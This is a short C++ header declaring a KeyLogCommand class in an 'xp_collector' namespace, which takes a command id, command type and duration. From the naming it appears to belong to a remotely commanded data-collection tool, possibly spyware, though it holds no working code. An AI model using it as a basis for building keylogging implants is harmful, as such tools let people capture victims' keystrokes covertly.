#pragma once
#include "Commands/BasicCommand.h"

namespace xp_collector
{
class KeyLogCommand :
	public BasicCommand
{
public:
	explicit KeyLogCommand(std::string command_id, CommandType command_type, unsigned int duration);

	[[nodiscard]] unsigned int get_duration() const;

private:
	const unsigned int m_duration;
};
}
